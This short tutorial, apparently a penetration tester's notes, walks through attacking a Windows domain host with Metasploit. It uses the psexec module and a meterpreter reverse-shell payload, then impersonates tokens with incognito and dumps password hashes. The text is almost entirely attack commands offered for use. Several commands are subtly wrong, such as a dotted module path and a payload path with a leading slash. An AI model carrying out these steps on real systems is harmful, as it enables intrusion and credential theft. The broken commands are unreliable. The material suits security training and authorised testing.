To perform this attack you need to have the username and password of a domain user.
### Tooling
1. Metasploit

### The attack
Start metasploit on your machine by typing

```sh
msfconsole
```
Select `psexec` as your exploit by typing

```sh
use exploit/windows/smb.psexec
```

Set the required options for the exploits and **<u>set targets</u>**  by typing the following command

```sh
show targets
```

To see the targets that are there, for this attack vector we can use Native file upload in this target by doing
```sh
set target 2
```

We are going to set the payload to `/windows/x64/meterpreter/reverse_tcp` as the payload by typing

```sh
set payload /windows/x64/meterpreter/reverse_tcp
```

and set the required options and exploit.

### Getting tokens

Once we have our session, we can load post exploitation tools by doing `load` and tab to see the options we can set.

In this case we shall use incoginto so we can do

```sh
load incognito
```

We can look at tokens available by typing

```sh
list_tokens -u
```

we can then proceed by impersonating the tokens by typing

```sh
impersonate_token <token_name>
```

### Possible errors

We might get an error when we try and dump hashes using hashdump, if you get the error 
```sh
priv_passwd_get_sam_hashes: Operation failed: Access is denied.
```

We can type `rev2self` which will return us to our original state and perform the actions again.
